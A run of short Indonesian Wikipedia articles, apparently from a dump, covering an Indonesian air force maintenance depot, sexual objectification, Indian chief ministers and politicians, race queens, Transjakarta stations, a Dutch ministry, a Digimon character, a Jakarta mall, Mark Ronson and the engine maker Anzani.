Dalam perkembangan selanjutnya Depot Teknik 012 mengalami penyempurnaan yang bertujuan untuk meng-efisiensikan beban tugas yang semakin berat dan kompleks. Revitalisasi Depot Teknik 012 ini dilakukan dengan menggabungkan kesatuan-kesatuan teknik yang ada di Lanud seperti Depot teknik 012, Sub Depot materiil 063 dab Depo Teknik 031 (divisi kesenjataan). Selanjutnya dibentuk kesatuan dengan nama Wing logistik 30 (Winglog 30) yang selanjutnya berubah nama menjadi Depo Pesawat Terbang 30 (Depo Pesbang 30) dan terakhir menjadi Depo Pemeliharaan 30. Dalam perkembangan selanjutnya Depot Teknik 012 mengalami penyempurnaan yang bertujuan untuk meng-efisiensikan beban tugas yang semakin berat dan kompleks. Revitalisasi Depot Teknik 012 ini dilakukan dengan menggabungkan kesatuan-kesatuan teknik yang ada di Lanud seperti Depot teknik 012, Sub Depot materiil 063 dab Depo Teknik 031 (divisi kesenjataan). Selanjutnya dibentuk kesatuan dengan nama Wing logistik 30 (Winglog 30) yang selanjutnya berubah nama menjadi Depo Pesawat Terbang 30 (Depo Pesbang 30) dan terakhir menjadi Depo Pemeliharaan 30.

Prestasi yang telah ditorehkan oleh beliau berhasil memelihara pesawat tempur Hawk 100/200 sebanyak 5 buah dan 2 pesawat tempur Super Tucano.

Depohar 30 membawahi tiga satuan pemeliharaan (Sathar) yaitu:



</doc>
<doc id="1755572" url="https://id.wikipedia.org/wiki?curid=1755572" title="Objektifikasi seksual">
Objektifikasi seksual

Obyektifikasi seksual adalah tindakan memperlakukan seseorang sebagai alat pemuas hasrat seksual. Obyektifikasi secara luas, bermakna tindakan memperlakukan seseorang sebagai sebuah benda atau komoditas, tanpa memperhatikan kepribadian dan harga dirinya. Obyektifikasi seksual secara umum dicermati dalam tataran sosial kemasyarakatan, akan tetapi dapat juga merujuk kepada perilaku pribadi.

Konsep mengenai objektifikasi seksual, atau secara khusus, objektifikasi terhadap perempuan, adalah gagasan penting dalam teori feminis. Kebanyakan kaum feminis memandang objektifikasi seksual sebagai hal yang tercela, dan merupakan faktor yang memainkan peran penting dalam ketidaksetaraan jender.

Beberapa komentator sosial berpendapat, bahwa sebagian perempuan modern justru menjadikan diri mereka sendiri sebagai objek seks, sebagai bentuk ekspresi pemberdayaan diri mereka atas laki-laki, sebagai pernyataan kebebasan mengekspresikan seksualitas mereka. Sementara pihak berpendapat bahwa, di zaman modern ini, dengan semakin kuatnya kemerdekaan seksual kaum perempuan, gay, dan biseksual, maka objektifikasi seksual pun kini dapat menimpa kaum laki-laki.





</doc>
<doc id="1755575" url="https://id.wikipedia.org/wiki?curid=1755575" title="Daftar ketua menteri dari Partai Bharatiya Janata">
Daftar ketua menteri dari Partai Bharatiya Janata

Partai Bharatiya Janata (PBJ) adalah salah satu dari dua partai utama dalam sistem politik di Republik India, yang lainnya adalah Kongres Nasional India (KNI). Didirikan pada 1980, platform PBJ umumnya dianggap sebagai sayap kanan dari spektrum politik. , 42 pemimpin PBJ telah memegang jabatan ketua menteri, 16 diantaranya adalah petahana. Seorang ketua menteri adalah kepala pemerintah dari setiap dua puluh sembilan negara bagian dan dua teritorial serikat (TS) (Delhi dan Puducherry). Menurut konstitusi India, di tingkat negara bagian, gubernur adalah kepala "de jure", tetapi otoritas eksekutif "de facto" dikepalai oleh ketua menteri. Setelah pemilihan-pemilihan dari mahkamah legislatif negara bagian, gubernur biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, dimana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Dari 42 ketua menteri PBJ, 14 adalah petahana—Pema Khandu di Arunachal Pradesh, Sarbananda Sonowal di Assam, Raman Singh di Chhattisgarh, Manohar Parrikar di Goa, Vijay Rupani di Gujarat, Manohar Lal Khattar di Haryana, Jai Ram Thakur di Himachal Pradesh, Raghubar Das di Jharkhand, Shivraj Singh Chouhan di Madhya Pradesh, Devendra Fadnavis di Maharashtra, N. Biren Singh in Manipur, Vasundhara Raje in Rajasthan, Biplab Kumar Deb in Tripura, Trivendra Singh Rawat di Uttarakhand, dan Yogi Adityanath di Uttar Pradesh. Empat dari ketua menteri PBJ adalah seorang wanita—Sushma Swaraj di Delhi, Uma Bharti di Madhya Pradesh, Patel di Gujarat dan Raje di Rajasthan. Memegang jabatan tersebut sejak Oktober 2001 (selama ) sampai ia menjadi Perdana Menteri India pada 2014, Modi adalah ketua menteri yang paling lama menjabat dari PBJ. Lama jabatan pertama B. S. Yeddyurappa di Karnataka sebagai ketua menteri hanya berlangsung selama sembilan hari, yang menjadikannya masa jabatan ketua menteri terpendek dari PBJ; namun, dilihat dari total seluruh masa jabatan dalam konsiderasi, Swaraj menjabat sebagai ketua menteri untuk periode terpendek yakni 52 hari. Bhairon Singh Shekhawat dari Rajasthan adalah ketua menteri pertama dari PBJ; namun beberapa pemimpin PBJ telah terpilih sebelumnya sebagai ketua menteri ketika menjadi anggota Partai Janata (PJ), sebuah amalgam dari partai politik yang meliputi pendahulu PBJ Bharatiya Jana Sangh. Terdapat empat ketua menteri dari PBJ di Gujarat, Madhya Pradesh dan Uttarakhand, sementara terdapat tiga pemimpin PBJ yang menjadi ketua menteri masing-masing di Delhi dan Uttar Pradesh.






</doc>
<doc id="1755578" url="https://id.wikipedia.org/wiki?curid=1755578" title="Gadis balap">
Gadis balap

Gadis balap, ratu balap, gadis pit, atau gadis payung adalah sebutan yang merujuk kepada gadis cantik model promosi yang ditempatkan di pit dan lintasan balap, dan menjadi anggota tim penggembira dalam gelaran acara balap mobil atau motor, misalnya Formula Satu atau MotoGP.

Penggunaan model (peragawati) promosi dalam acara balap kendaraan bermotor pertama kali terjadi pada akhir 1960-an, ketika seorang gadis peragawati bernama didatangkan untuk mendampingi sang juara. Saat itulah istilah "race queen" (ratu balap) tercetus. Sebelumnya, perempuan yang terlibat dalam perhelatan balap biasanya adalah istri atau pacar sang pembalap atau staf balap (dengan pengecualian pembalap perempuan yang memang terlibat di dunia balap).

Pada 1983, perusahaan losion Hawaiian Tropic menyeponsori helatan 24 Hours of Le Mans. Perusahaan ini memboyong beberapa model cantik dari Amerika Serikat untuk tampil di lintasan balap sesaat sebelum balapan dimulai. Para model ini hanya mengenakan bikini yang bertuliskan nama perusahaan. Setahun kemudian, praktik ini ditiru Jepang pada gelaran balap motor Suzuka 8 Hours.



</doc>
<doc id="1755583" url="https://id.wikipedia.org/wiki?curid=1755583" title="Mamata Banerjee">
Mamata Banerjee

Mamata Banerjee ("Mômota Bôndyopadhyay") (kelahiran 5 Januari 1955) adalah seorang politikus India yang menjadi Ketua Menteri Bengal Barat sejak 2011. Ia merupakan wanita pertama yang memegang jabatan tersebut. Banerjee mendirikan partai Kongres Trinamool Seluruh India (KTMSI atau KTM) pada 1997 dan menjadi ketuanya, setelah memisahkan diri dari Kongres Nasional India. Ia sering disebut sebagai "Didi" (artinya "saudari tua" dalam bahasa Bengali). Pada 2011, Banerjee meraih kemenangan untuk aliansi Kongres KTM di Bengal Barat dengan mengalahkan pemerintahan Front Kiri yang dipimpin Partai Komunis India (Marxis) yang berusia 34 tahun, pemerintahan komunitas yang terpilih secara demokratis yang paling lama menjabat di dunia.

Banerjee sebelumnya menjabat sebagai Menteri Jalur Kereta Api sebanyak dua kali dan juga menjadi wanita pertama yang menjabat sebagai Menteri Jalur Kereta Api India, Menteri Batubara, dan Menteri Negara untuk Pengembangan Sumber Daya Manusia, Departemen Urusan Pemuda dan Olahraga dan Wanita dan Perkembangan Anak-Anak di kabinet pemerintahan India. Ia menentang akuisisi lahan secara paksa untuk industrialisasi oleh pemerintah komunis di Bengal Barat untuk Zona Ekonomi Khusus di tanah milik agrikulturalis dan petani.

Pada 2012, majalah "Time" menjadikannya salah satu dari "100 Tokoh Paling Berpengaruh di Dunia". Pada September 2012, majalah Bloomberg Markets menjadikannya salah satu dari 50 orang paling berpengaruh di dunia keuangan. Pemimpin KTM merkurial tersebut disuarakan pada Mei 2013 sebagai politikus paling bersih di India dalam sebuah jajak pendapat internal oleh para anggota India Melawan Korupsi, koalisi anti-korupsi terbesar di India.

Banerjee lahir di Kalkuta (sekarang Kolkata), Bengal Barat dalam sebuah keluarga Brahmin Bengali dari pasangan Promileswar Banerjee dan Gayetri Devi. Ia tumbuh dalam sebuah keluarga kelas menengah kebawah. Ayah Banerjee meninggal karena kekurangan pengobatan medis, ketika ia berusia 17 tahun.

Pada 1970, Banerjee menyelesaikan ujian kelulusan sekolah menengah tinggi dari Deshbandhu Sishu Sikshalay. Banerjee lulus dengan sebuah gelar kehormatan dalam bidang Sejarah dari Kolese Jogamaya Devi, sebuah kolese kelulusan khusus wanita di selatan Kolkata. Kemudian ia meraih gelar master dalam bidang Sejarah Islam dari Universitas Kalkuta. Hal ini diikuti oleh sebuah gelar dalam bidang pendidikan dari Kolese Shri Shikshayatan. Ia juga meraih sebuah gelar hukum dari Kolese Hukum Jogesh Chandra Chaudhuri, Kolkata. Ia dihargai dengan gelar DLitt dari Institut Teknologi Industri Kalinga.

Banerjee menjadi ikut terlibat dalam dunia politik ketika ia baru berusia 15 tahun. Ketika belajar di Kolese Jogamaya Devi, ia mendirikan "Chhatra Parishad Unions", sayap pelajar dari Partai Kongres (I), mengalahkan Pusat Persatuan Sosialis Serikat Pelajar Demokratik India. Ia melanjutkan di Partai Kongres (I) di Bengal Barat dengan menduduki berbagai jabatan pada partai tersebut dan organisasi politik lokal lainnya. Sebagai seorang wanita muda pada 1970an, ia dengan cepat naik peringkat dengan menjadi sekretaris jenderal negara bagian Kongres Mahila (1976–80).

Meskipun kehidupan politik Banerjee umumnya menggunakan gaya hidup austere, ia selalu mengenakan saree kapas Bengali tradisional sederhana yang disebut 'tant' dan tidak menggunakan kosmetik atau perhiasan. Ia masih tidak menikah selama hidupnya.

Banerjee adalah seorang penyair dan pelukis yang belajar sendiri.

Banerjee memulai karier politiknya di partai Kongres, dan sebagai seorang wanita muda pada 1970an, ia dengan cepat naik pangkat kelompok Kongres lokal, dan menjadi Sekretaris Jenderal Kongres Mahila (I), Bengal Barat, dari 1976 sampai 1980. Pada pemilihan umum 1984, Banerjee menjadi salah satu anggota parlemen termuda di India yang pernah ada, mengalahkan politikus Komunis veteran Somnath Chatterjee, dari Konstituensi parlementer Jadavpur di Bengal Barat. Ia juga menjadi Jenderal-Sekretaris Kongres Pemuda India. Kehilangan kursinya pada 1989 dalam sebuah arus anti-Kongres, ia kembali pada pemilihan umum 1991, yang membuatnya menduduki Konstituensi Kalkuta Selatan. Ia berkali-kali mendapatkan kursi Kolkata Selatan pada pemilihan umum 1996, 1998, 1999, 2004 dan 2009.

Dalam pemerintahan Rao yang dibentuk pada 1991, Mamata Banerjee menjadi Menteri Serikat Negara untuk Pengembangan Sumber Daya Manusia, Urusan Pemuda dan Olahraga, dan Wanita dan Perkembangan Anak-Anak.

Pada 1997, Mamata Banerjee meninggalkan Partai Kongres di Bengal Barat dan mendirikan Kongres Trinamool Seluruh India. Partai tersebut dengan cepat menjadi partai oposisi primer untuk pemerintahan Komunis yang lama berdiri di negara bagian tersebut.





</doc>
<doc id="1755586" url="https://id.wikipedia.org/wiki?curid=1755586" title="Kementerian Agribudaya, Alam dan Kualitas Pangan (Belanda)">
Kementerian Agribudaya, Alam dan Kualitas Pangan (Belanda)

Kementerian Agribudaya, Alam dan Kualitas Pangan ("Ministerie van Landbouw, Natuurbeheer en Voedselkwaliteit"; LNV) awalnya adalah kementerian agribudaya di Belanda. Pada 14 Oktober 2010, ketika kabinet Rutte dibentuk, departemen tersebut digabung dengan Kementerian Urusan Ekonomi untuk membentuk Ministry of Economic Affairs, Agriculture and Innovation yang baru.

Kementerian tersebut bertanggung jawab untuk empat bidang kebijakan:

Kementerian tersebut didirikan sebagai sebuah kementerian yang terpisah, yang bernama "Kementerian Agribudaya dan Perikanan", pada 1935. Kebijakan agribudaya dan perikanan sebelumnya diintegrasikan dalam Kementerian Dalam Negeri dan Hubungan Kerajaan dan kemudian dalam Kementerian Perairan, Perdagangan dan Industri.

Setelah Perang Dunia Kedua, Kementerian tersebut menjadi bertanggung jawab untuk merasiokan pangan dan rekonstruksi sektor agribudaya. Sehingga bidang-bidang tersebut menjadi lebih berpengaruh. Antara 1946 dan 1982, kementerian tersebut menjadi sebuah "klien" berorientasi kementerian, yang berorientasi pada pengembangan sektor agribudaya dalam akurdansi kepada Kebijakan Agribudaya Umum Eropa. Pada 1982, kementerian tersebut menjadi bertanggung jawab untuk konservasi alam dan rekreasi udara terbuka, yang digunakan untuk menjadi bagian dari tanggung jawab Kementerian Budaya, Rekreasi dan Karya Sosial. Sehingga kementerian tersebut menjadi lebih berfokus pada pengembangan sustainabel dari sektor agribudaya.

Pada 2003, Otoritas Barang dan Pangan menjadi bagian dari kementerian tersebut, yang berganti nama menjadi Kementerian Agribudaya, Alam dan Kualitas Pangan.

Sejak 1989, berikut politikus yang menjadi menteri Agribudaya, Alam dan Kualitas Pangan




</doc>
<doc id="1755588" url="https://id.wikipedia.org/wiki?curid=1755588" title="Kali Besar Barat (Transjakarta)">
Kali Besar Barat (Transjakarta)

Kali Besar Barat adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Kali Besar Barat, Kota Tua Jakarta, Roa Malaka, Tambora, Jakarta Barat. Stasiun BRT ini berada di Koridor 12 yang membentang dari barat ke timur Jakarta. Stasiun BRT ini hanya melayani bus menuju Penjaringan, dan juga merupakan salah satu dari dua stasiun BRT Transjakarta yang memiliki desain Art Deco selain stasiun BRT Fatahillah yang juga terletak pada koridor ini.




</doc>
<doc id="1755589" url="https://id.wikipedia.org/wiki?curid=1755589" title="Bandengan Pekojan (Transjakarta)">
Bandengan Pekojan (Transjakarta)

Bandengan Pekojan adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Bandengan Selatan, Pekojan, Tambora, Jakarta Barat. Stasiun BRT ini berada di Koridor 12 yang membentang dari barat ke timur Jakarta. Stasiun BRT ini hanya melayani bus menuju Penjaringan.




</doc>
<doc id="1755596" url="https://id.wikipedia.org/wiki?curid=1755596" title="Arvind Kejriwal">
Arvind Kejriwal

Arvind Kejriwal (kelahiran 16 Agustus 1968) adalah seorang politikus, aktivis sosial dan mantan pejabat Pelayanan Revenue India asal India yang merupakan Ketua Menteri Delhi ketujuh dan saat ini. Ini adalah masa jabatan keduanya sebagai Ketua Menteri, setelah Partai-nya memenangkan pemilihan Mahkamah Delhi 2015 dengan suara mayoritas, memenangkan 67 dari 70 kursi mahkamah. Ia adalah konvener nasional dari Partai Aam Aadmi (PAA).

Kejriwal adalah lulusan Teknik Mekanikal dari Institut Teknologi India Kharagpur, dan bekerja untuk Pelayanan Revenue India (PRI) sebagai Komisioner Bersama dalam Departemen Pajak Pemasukan.

Pada 2006, Kejriwal dianugerahi Penghargaan Ramon Magsaysay untuk Kepemimpinan Darurat yang menghargai keterlibatannya dalam gerakan "Parivartan" menggunakan legislasi hak untuk informasi dalam sebuah kampanye melawan korupsi. Pada tahun yang sama, setelah mengundurkan diri PRI, ia menyumbangkan uang penghargaan Magsaysay-nya sebagai amal korpus untuk pendirian Yayasan Penelitian Sebab-Sebab Publik, sebuah organisasi non-pemerintahan (ONP).

Pada 2012, ia meluncurkan Partai Aam Aadmi, dan mengalahkan Ketua Menteri Sheila Dikshit dalam Pemilihan Mahkamah Legislatif Delhi 2013. Setelah pemilihan tersebut, ia menjabat sebagai Ketua Menteri Delhi pada 28 Desember 2013. Ia mengundurkan diri 49 hari kemudian, pada 14 Februari 2014.

Pada 14 Februari 2015, ia diangkat sebagai Ketua Menteri untuk masa jabatan kedua setelah kemenangannya dalam pemilihan mahkamah tersebut.

Kejriwal lahir dalam sebuah keluarga kelas menengah di Siwani, distrik Bhiwani, Haryana pada 16 Agustus 1968, sebagai anak sulung dari tiga bersaudara dari pasangan Gobind Ram Kejriwal dan Gita Devi. Ayahnya adalah seorang teknisi elektrik yang lulus dari Institut Teknologi Birla, Mesra, dan bekerja untuk melakukan beberapa perubahan di tempat tinggal keluarganya. Kejriwal menjalani sebagian besar masa kecilnya di kota-kota utara India seperti Sonepat, Ghaziabad dan Hisar. Ia dididik di Sekolah Kampus di Hisar dan di sebuah sekolah misionaris Kristen di Sonipat.

Ia menjalani beberapa waktu di Kolkata, di mana ia bertemu dengan Bunda Teresa, dan secara sukarela dengan Misionaris-Misionaris Amal dan di Misi Ramakrishna di Timur Laut India dan di Nehru Yuva Kendra.

Pada 1995, Arvind Kejriwal menikah dengan Sunita, kenalannya yang berasal dari Akademi Administrasi Nasional di Mussoorie dan Akademi Perpajakan Langsung Nasional di Nagpur. Pasangan tersebut memiliki dua anak. Kejriwal adalah vegetarian dan mempraktikan teknik meditasi Vipassana untuk beberapa tahun. Ia adalah diabetik.






</doc>
<doc id="1755607" url="https://id.wikipedia.org/wiki?curid=1755607" title="Partai Demokratik Rakyat Jammu dan Kashmir">
Partai Demokratik Rakyat Jammu dan Kashmir

Partai Demokratik Rakyat Jammu dan Kashmir (PDR) adalah sebuah partai politik negara bagian di Jammu dan Kashmir, India. Partai tersebut didirikan pada 1998 oleh mantan Menteri Dalam Negeri Serikat, Mufti Mohammed Sayeed, dan mendapatkan kekuasaan di negara bagian Jammu dan Kashmir pada pemilihan Mahkamah Oktober 2002. Pada 2004, partai tersebut memiliki masing-masing satu anggota di Lok Sabha dan Rajya Sabha. Partai tersebut merupakan anggota dari koalisi pemerintahan Aliansi Progresif Serikat sampai pemilihan 2009.

PDR dikepalai oleh Ms Mehbooba Mufti, sementara Mufti Mohammad Sayeed, yang mengepalai Koalisi Pemerintahan PDP-Kongres Nasional India antara Oktober 2002 dan November 2005, adalah perlindungan partai tersebut.

PDR dioperasikan atas dasar ideologi pemerintahan sendiri, sebagai perbedaan distinsif dari masalah-masalah otonomi. Partai tersebut percaya bahwa pemerintahan sendiri sebagai filsafat politik, sebagai perlawanan terhadap otonomi, penyetujuan pemberian kekuatan kepada rakyat Jammu dan Kashmir, sementara melakukan upaya tambahan dalam debat-debat mengenai teritorialitas politik baru di J&K.
Setelah pemilihan umum 2014, 3 anggotanya terpilih di Lok Sabha. Kekuatannya di Mahkamah Legislatif adalah 28 orang dan di Rajya Sabha adalah 2 orang. Partai tersebut sekarang maju dalam pemerintahan koalisi di J&K dengan Aliansi Demokratik Nasional yang dipimpin Partai Bharatiya Janata.



</doc>
<doc id="1755619" url="https://id.wikipedia.org/wiki?curid=1755619" title="WereGarurumon">
WereGarurumon

WereGarurumon merupakan salah satu digimon yang menjadi peran utama dalam Digimon Adventure dan Digimon Adventure 02. WereGarurumon berasal dari kata "Werewolf" dan "Garurumon" yang menunjukkan bahwa digimon ini merupakan bentuk humanoid dari Garurumon. Dalam tingkatan level evolusi, WereGarurumon berlevel Ultimate. Ia berevolusi dari Garurumon, dan evolusi berikutnya (level Mega) adalah MetalGarurumon. Partnernya dalam seri anime Digimon Adventure dan Digimon Adventure 02 adalah Yamato Ishida.

Garurumon berevolusi menjadi WereGarurumon pada episode 23 dalam pertarungan melawan Digitamamon. Simbol Persahabatan Yamato menyala karena drama persahabatan yang dibawanya bersama Joe Kido dan Taichi Kamiya, sehingga Garurumon berevolusi menjadi WereGarurumon dan mampu menalahkan Digitamamon.

Kekuatan utama WereGarurumon adalah serangan fisik berupa pukulan dan tendangan yang sangat kuat dan tajam karena cakar serigalanya.



</doc>
<doc id="1755627" url="https://id.wikipedia.org/wiki?curid=1755627" title="Daftar Ketua Menteri Punjab (India)">
Daftar Ketua Menteri Punjab (India)

Ketua Menteri Punjab, sebuah negara bagian utara India, adalah kepala Pemerintahan Punjab. Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, namun otoritas eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan-pemilihan dari Mahkamah Legislatif Punjab, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Sejak 1947, Punjab telah memiliki lima belas ketua menteri. Yang pertama adalah Gopi Chand Bhargava dari partai Kongres Nasional India, yang diangkat pada 15 Agustus 1947, ketika India meraih kemerdekaan dari Britania. Ia digantikan oleh anggota Kongres Bhim Sen Sachar, yang kemudian digantikan setelah 188 hari oleh mantan Ketua Menteri Gopi Chand Bhargava. Setelah masa jabatan tersebut, Presiden Rajendra Prasad menempatkan Mahkamah Legislatif Punjab di bawah suspensi selama sembilan bulan untuk membantu pemerintah negara bagian mengambil tindakannya bersama. Pada 1952, the first pemilihan negara bagian mengambil tempat untuk Mahkamah Legislatif. Hasil dari pemilihan tersebut menyatakan kembalinya pemerintahan Kongres dengan mantan Ketua Menteri Bhim Sen Sachar sebagai pemimpinnnya. Setelah ia mengundurkan diri pada 1956, Partap Singh Kairon menjadi ketua menteri. Menjabat sampai 1964, Khairon masih menjadi salah satu ketua menteri yang paling lama menjabat di Punjab. Ia disusul oleh kembalinya Ketua Menteri Gopi Chand Bhargava, yang memegang jabatan sebagai pelaksana jabatan ketua menteri hanya selama 15 hari. Pada Juli 1964, Ram Kishan memegang jabatan tersebut dan menjabat selama dua tahun. Masa jabatannya diikuti oleh pemerintahan presiden yang berlangsung selama 119 hari. Pada masa ini, negara bagian Haryana memisahkan diri dari Punjab.

Pada Mei 2015, tiga mantan ketua menteri masih hidup, yang tertua adalah Surjit Singh Barnala (1985–1987, kelahiran 1925). Kematian terkini dari mantan ketua menteri adalah Harcharan Singh Brar (1995–1996), pada 6 September 2009.



</doc>
<doc id="1755628" url="https://id.wikipedia.org/wiki?curid=1755628" title="Mufti Mohammad Sayeed">
Mufti Mohammad Sayeed

Mufti Mohammad Sayeed () adalah seorang politikus dari negara bagian Jammu dan Kashmir di India. Ia adalah Ketua Menteri Jammu dan Kashmir yang menjabat dari Maret 2015 sampai kematiannya pada 7 Januari 2016. Ia sebelumnya juga menjabat sebagai Ketua Menteri dari 2 November 2002 sampai 2 November 2005. Ia mendirikan Partai Demokratik Rakyat Jammu dan Kashmir pada Juli 1999. Pada 1 Maret 2015, Mufti Muhammad Sayeed diangkat sebagai Ketua Menteri Jammu dan Kashmir untuk kedua kalinya.

Mohammad Sayeed menjadi anggota partai Kongres Nasional India sampai 1987.



</doc>
<doc id="1755637" url="https://id.wikipedia.org/wiki?curid=1755637" title="Lippo Mall Kemang">
Lippo Mall Kemang

Lippo Mall Kemang adalah salah salah satu pusat perbelanjaan di kawasan Kemang, Jakarta Selatan yang mulai beroperasi pada tahun 2012. Lippo Mall Kemang merupakan bagian dari kawasan pembangunan Kemang Village, dan dikenal dengan sebutan Kemang Village atau Kemvil.

Beberapa tenant yang ada di Lippo Mall Kemang adalah:Kemang Village XXI, Starbucks, Hypermart, dan lainnya.

Berikut ini adalah daftar penyewa di pusat perbelanjaan Lippo Mall Kemang.
(*) Lantai Dahulunya : B3, B2, B1

(*) Debenhams Lippo Mall Kemang tutup sejak akhir September 2016 dan akan diganti Matahari Department Store dan H&M.


</doc>
<doc id="1755649" url="https://id.wikipedia.org/wiki?curid=1755649" title="Nitish Kumar">
Nitish Kumar

Nitish Kumar (kelahiran 1 Maret 1951) adalah seorang politikus India yang merupakan seorang Ketua Menteri Bihar petahana sejak Februari 2015. Sebelumnya, ia menjabat sebagai Ketua Menteri Bihar dari 2005 sampai 2014 dan menjabat sebagai seorang Menteri dalam Pemerintahan Serikat India. Ia berasal dari partai Janata Dal (United). Sebagai Ketua Menteri, ia meraih kemenangan karena ia menginisasikan serangkaian pengembangan dan aktivitas konstruktif.

Pada 17 Mei 2014, ia mengundurkan diri. Namun, ia kembali menjabat pada Februari 2015 setelah krisis politik.

Nitish Kumār lahir di Bihar dalam sebuah keluarga Kurmi dari pasangan Kaviraj Ram Lakhan Singh dan Parmeshwari Devi. Ayahnya adalah seorang pejuang kebebasan dan akrab dengan Gandhian besar "Bihar Vibhuti" Anugrah Narayan Sinha, salah satu pendiri Bihar modern. Ayahnya, yang juga menjadi seorang Ayurvedic Vaidyaraj, meninggalkan Kongres Nasional India untuk bergabung dengan Partai Janata.

Ia memiliki sebuah gelar dalam bidang Teknik Elektrik dari NIT Patna (awalnya dikenal sebagai Kolese Teknik Bihar, Patna ). Ia bergabung dengan Badan Elektrisitas Negara Bagian Bihar, dan kemudian berpindah ke politik.

Nitish Kumar masuk ke kelas politikus sosialis. Ia mempelajari pelajaran politik di bawah pengajaran Jayaprakash Narayan, Ram Manohar Lohia, Karpoori Thakur, George Fernandes, S N Sinha dan V. P. Singh.

Nitish Kumar berpartisipasi dalam gerakan Jayaprakash Narayan antara 1974 dan 1977, dan menjadi akrab dengan Satyendra Narayan Sinha, seorang pemimpin berpengaruh pada waktu itu.



</doc>
<doc id="1755727" url="https://id.wikipedia.org/wiki?curid=1755727" title="Mark Ronson">
Mark Ronson

Mark Daniel Ronson (lahir pada 4 September 1975 di London, Inggris) adalah seorang musisi, DJ, penyanyi serta produser rekaman asal Inggris. Ketika album perdananya yang berjudul "Here Comes the Fuzz" telah gagal berpengaruh pada tangga lagu, kemudian ia meluncurkan album keduanya yang berjudul "Version" sukses meraih peringkat kedua pada daftar album di Inggris. Pada tahun 2014, dia meraih peringkat teratas di Inggris dan Amerika Serikat berkat lagunya "Uptown Funk" dengan vokal utamanya dari Bruno Mars. Pada bulan Januari 2015, album studionya yang keempat yang diberi nama "Uptown Special" telah dirilis. Mark Ronson juga telah menghasilkan multiplatform serta album-album yang berhasil meraih piala Grammy untuk artis-artis seperti Amy Winehouse dan Adele.

Pada tahun 2002, dia sudah mulai berkencan dengan Rashida Jones yang merupakan seorang penyanyi dan anak dari artis Quincy Jones. Pada Maret 2003, mereka telah bertunangan atas usulan Mark Ronson yaitu dengan membuat sebuah teka teki silang yang didalamnya terdapat pesan yang berbunyi pertanyaan dari Ronson kepada Rashida Jones untuk menikah. Hubungan percintaan mereka telah berakhir sekitar setahun sesudah pernikahan mereka.

Kemudian, dia menikah lagi dengan salah satu aktris dan penyanyi asal Prancis yaitu Josephine de La Baume yang dikenal melalui video klip lagunya yang berjudul "The Bike Song". Mereka berdua memutuskan menikah pada tanggal 5 September 2011 di kota Aix-en-Provence yang terletak di bagian selatan Prancis.

Pada tahun 2009, dia pernah mengambil bagian dalam kampanye PETA dengan tema "Please Don't Wear Any Fur" (bahasa Indonesia: "Tolong Jangan Pakai Bulu Hewan Mana Pun") dan pernah meraih suara terbanyak sebagai pria yang paling bergaya di Inggris dari majalah GQ. Pada tahun 2015, nama Mark Ronson mulai disebut sebagai salah satu dari lima puluh pria yang berpakaian terbaik di Inggris Raya.

Sejak tahun 2011, gambaran kehidupan mengenai Mark Ronson dilukis oleh salah seorang artis asal Inggris yaitu Joe Simpson, hasil lukisan tersebut disaksikan di dalam Royal Albert Hall di kota London. Ia pernah membagi waktunya antara di kota London dan kota New York. Sejak kecil, ia sudah menjadi penggemar klub sepak bola asal Inggris yaitu Chelsea serta menjadi penggemar klub bola basket New York Knicks.


</doc>
<doc id="1755795" url="https://id.wikipedia.org/wiki?curid=1755795" title="Daftar Ketua Menteri Karnataka">
Daftar Ketua Menteri Karnataka

Ketua Menteri Karnataka adalah kepala pemerintahan negara bagian Karnataka, India Selatan. Sesuai dengan Konstitusi India, gubernur berperan sebagai kepala negara bagian secara "de jure", sedangkan kewenangan eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan umum untuk Majelis Legislatif Karnataka, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi untuk membentuk pemerintahan. Gubernur yang mengangkat ketua menteri, di mana dewan menterinya bertanggung jawab secara kolektif kepada majelis tersebut. Karena dia memperoleh kepercayaan dari majelis, masa jabatan ketua menteri adalah selama lima tahun dan tidak ada pembatasan masa jabatan.

Sejak tahun 1947, dua puluh dua orang telah menjadi Ketua Menteri Mysore (sebagaimana negara bagian ini dikenal sebelum 1 November 1973) dan Karnataka. Sebagian besar dari mereka berasal dari partai Kongres Nasional India, termasuk pejabat perdana K. Chengalaraya Reddy. Ketua menteri yang menjabat terlama, D. Devaraj Urs, memegang jabatan tersebut selama lebih dari tujuh tahun pada 1970-an. Sebagai anggota Partai Janata, Ramakrishna Hegde menjabat dengan masa jabatan paling banyak secara tidak beruntun (tiga kali), sementara Veerendra Patil dari Kongres memiliki selang waktu terbesar antara dua masa jabatan (lebih dari delapan belas tahun). Seorang ketua menteri, H. D. Deve Gowda, kemudian menjadi Perdana Menteri India kesebelas, sementara yang lainnya, B. D. Jatti, menjabat sebagai Wakil Presiden kelima negara tersebut. Terdapat enam peristiwa pemerintahan presiden di Karnataka, yang paling terbaru pada 2007–2008.





</doc>
<doc id="1755803" url="https://id.wikipedia.org/wiki?curid=1755803" title="Anzani">
Anzani

Anzani adalah produsen manufaktur mesin didirikan oleh Italia Alessandro Anzani (1877-1956), yang menghasilkan mesin proprietary untuk pesawat, mobil, kapal, dan sepeda motor di pabrik-pabrik di Inggris, Prancis dan Italia.

Dari asalnya Italia, Anzani pindah ke Prancis di mana ia menjadi terlibat dalam siklus balap. Dia pindah ke sepeda motor dan merancang dan membangun mesin ringan yang memecahkan rekor. Pada tahun 1907, ia mendirikan sebuah bengkel kecil di Paris dengan tiga staf dan sementara mereka membangun mesin, ia merancang hydrofoil dan didukung oleh salah satu mesin dan baling-baling nya.

